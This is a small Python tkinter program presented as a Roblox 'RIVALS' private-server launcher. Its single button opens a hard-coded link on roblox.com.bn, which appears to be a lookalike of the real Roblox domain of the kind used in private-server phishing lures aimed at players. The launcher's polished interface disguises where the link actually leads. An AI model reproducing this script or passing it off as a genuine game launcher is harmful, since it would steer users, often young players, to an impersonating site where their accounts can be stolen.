
import tkinter as tk
import webbrowser
import os

URL = "https://www.roblox.com.bn/games/17625359962/RIVALS?privateServerLinkCode=81462111633282358537205120687114"

def find_chrome():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def open_server():
    chrome_path = find_chrome()
    if chrome_path:
        webbrowser.register('chrome', None, webbrowser.BackgroundBrowser(chrome_path))
        webbrowser.get('chrome').open(URL)
    else:
        webbrowser.open(URL)

def hover_on(e):
    btn.config(bg="#00b0ff", fg="black")

def hover_off(e):
    btn.config(bg="#1f8fff", fg="white")

def pulse():
    size = btn.cget("font").split()[1]
    try:
        size = int(size)
    except:
        size = 12
    new = 13 if size == 12 else 12
    btn.config(font=("Segoe UI", new, "bold"))
    root.after(600, pulse)

root = tk.Tk()
root.title("RIVALS Launcher")
root.geometry("460x260")
root.configure(bg="#0f1720")
root.resizable(False, False)

title = tk.Label(
    root,
    text="RIVALS SERVER LAUNCHER",
    font=("Segoe UI", 18, "bold"),
    fg="white",
    bg="#0f1720"
)
title.pack(pady=(25,10))

subtitle = tk.Label(
    root,
    text="Private Server Quick Join",
    font=("Segoe UI", 11),
    fg="#9aa4b2",
    bg="#0f1720"
)
subtitle.pack(pady=(0,25))

btn = tk.Button(
    root,
    text="OPEN SERVER IN GOOGLE",
    font=("Segoe UI", 12, "bold"),
    bg="#1f8fff",
    fg="white",
    activebackground="#00b0ff",
    activeforeground="black",
    padx=25,
    pady=12,
    bd=0,
    command=open_server,
    cursor="hand2"
)
btn.pack()

btn.bind("<Enter>", hover_on)
btn.bind("<Leave>", hover_off)

footer = tk.Label(
    root,
    text="Roblox RIVALS Launcher",
    font=("Segoe UI", 8),
    fg="#6b7280",
    bg="#0f1720"
)
footer.pack(side="bottom", pady=20)

pulse()
root.mainloop()
